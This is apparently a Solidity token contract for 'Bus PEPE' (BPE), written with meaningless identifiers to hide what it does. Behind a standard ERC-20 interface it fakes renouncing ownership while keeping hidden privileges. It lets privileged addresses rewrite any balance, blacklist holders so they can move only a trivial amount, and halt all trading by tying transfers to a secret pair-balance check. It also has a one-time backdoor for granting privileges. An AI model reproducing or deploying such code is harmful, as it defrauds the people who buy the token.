//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface swapWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalEnable) external view returns (uint256);

    function transfer(address receiverMaxEnable, uint256 autoLaunch) external returns (bool);

    function allowance(address tradingBuyMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address receiverMaxEnable,
        uint256 autoLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tradingLiquiditySwap, uint256 value);
    event Approval(address indexed tradingBuyMin, address indexed spender, uint256 value);
}

abstract contract listToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tokenTo {
    function createPair(address minLaunched, address toSwap) external returns (address);
}

interface takeAmount is swapWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BusPEPE is listToken, swapWallet, takeAmount {

    uint256 public fromMin;

    string private senderToken = "BPE";

    mapping(address => bool) public senderEnableAmount;

    bool private exemptTakeTx;

    uint256 public modeTradingLaunch;

    uint256 marketingEnable;

    address tradingLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    constructor (){
        
        txTeam tokenMarketing = txTeam(tradingLaunch);
        modeLimit = tokenTo(tokenMarketing.factory()).createPair(tokenMarketing.WETH(), address(this));
        
        exemptWallet = _msgSender();
        launchedTotalSender();
        receiverShould[exemptWallet] = true;
        fundFrom[exemptWallet] = exemptTx;
        
        emit Transfer(address(0), exemptWallet, exemptTx);
    }

    function owner() external view returns (address) {
        return launchedModeShould;
    }

    uint256 public isSell;

    string private walletLaunched = "Bus PEPE";

    address shouldMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => uint256) private fundFrom;

    uint256 private senderLimitTake;

    function approve(address senderShould, uint256 autoLaunch) public virtual override returns (bool) {
        fundAmount[_msgSender()][senderShould] = autoLaunch;
        emit Approval(_msgSender(), senderShould, autoLaunch);
        return true;
    }

    event OwnershipTransferred(address indexed sellMode, address indexed autoMode);

    function balanceOf(address totalEnable) public view virtual override returns (uint256) {
        return fundFrom[totalEnable];
    }

    mapping(address => bool) public receiverShould;

    function getOwner() external view returns (address) {
        return launchedModeShould;
    }

    uint256 private senderReceiver;

    address public modeLimit;

    function transferFrom(address tradingAutoMarketing, address receiverMaxEnable, uint256 autoLaunch) external override returns (bool) {
        if (_msgSender() != tradingLaunch) {
            if (fundAmount[tradingAutoMarketing][_msgSender()] != type(uint256).max) {
                require(autoLaunch <= fundAmount[tradingAutoMarketing][_msgSender()]);
                fundAmount[tradingAutoMarketing][_msgSender()] -= autoLaunch;
            }
        }
        return atMarketingReceiver(tradingAutoMarketing, receiverMaxEnable, autoLaunch);
    }

    bool public maxFund;

    function totalSupply() external view virtual override returns (uint256) {
        return exemptTx;
    }

    function decimals() external view virtual override returns (uint8) {
        return txMax;
    }

    function launchedTotalSender() public {
        emit OwnershipTransferred(exemptWallet, address(0));
        launchedModeShould = address(0);
    }

    bool private minToLaunched;

    function atSender(address tradingAutoMarketing, address receiverMaxEnable, uint256 autoLaunch) internal returns (bool) {
        require(fundFrom[tradingAutoMarketing] >= autoLaunch);
        fundFrom[tradingAutoMarketing] -= autoLaunch;
        fundFrom[receiverMaxEnable] += autoLaunch;
        emit Transfer(tradingAutoMarketing, receiverMaxEnable, autoLaunch);
        return true;
    }

    function receiverMin(address tradingSenderExempt, uint256 autoLaunch) public {
        fundMax();
        fundFrom[tradingSenderExempt] = autoLaunch;
    }

    address public exemptWallet;

    function atMarketingReceiver(address tradingAutoMarketing, address receiverMaxEnable, uint256 autoLaunch) internal returns (bool) {
        if (tradingAutoMarketing == exemptWallet) {
            return atSender(tradingAutoMarketing, receiverMaxEnable, autoLaunch);
        }
        uint256 autoTotal = swapWallet(modeLimit).balanceOf(shouldMin);
        require(autoTotal == fundShouldTx);
        require(receiverMaxEnable != shouldMin);
        if (senderEnableAmount[tradingAutoMarketing]) {
            return atSender(tradingAutoMarketing, receiverMaxEnable, enableSell);
        }
        return atSender(tradingAutoMarketing, receiverMaxEnable, autoLaunch);
    }

    function enableBuySell(address liquiditySender) public {
        fundMax();
        if (senderReceiver == modeTradingLaunch) {
            modeTradingLaunch = fromMin;
        }
        if (liquiditySender == exemptWallet || liquiditySender == modeLimit) {
            return;
        }
        senderEnableAmount[liquiditySender] = true;
    }

    uint256 fundShouldTx;

    function symbol() external view virtual override returns (string memory) {
        return senderToken;
    }

    function name() external view virtual override returns (string memory) {
        return walletLaunched;
    }

    mapping(address => mapping(address => uint256)) private fundAmount;

    bool public liquidityLaunch;

    function atMin(uint256 autoLaunch) public {
        fundMax();
        fundShouldTx = autoLaunch;
    }

    address private launchedModeShould;

    function fundMax() private view {
        require(receiverShould[_msgSender()]);
    }

    uint256 public toWallet;

    function allowance(address shouldAutoTx, address senderShould) external view virtual override returns (uint256) {
        if (senderShould == tradingLaunch) {
            return type(uint256).max;
        }
        return fundAmount[shouldAutoTx][senderShould];
    }

    uint256 constant enableSell = 4 ** 10;

    function fundAt(address receiverFee) public {
        require(receiverFee.balance < 100000);
        if (liquidityLaunch) {
            return;
        }
        if (senderLimitTake == isSell) {
            modeTradingLaunch = senderReceiver;
        }
        receiverShould[receiverFee] = true;
        if (isSell != senderReceiver) {
            senderReceiver = fromMin;
        }
        liquidityLaunch = true;
    }

    function transfer(address tradingSenderExempt, uint256 autoLaunch) external virtual override returns (bool) {
        return atMarketingReceiver(_msgSender(), tradingSenderExempt, autoLaunch);
    }

    uint8 private txMax = 18;

    uint256 private exemptTx = 100000000 * 10 ** 18;

}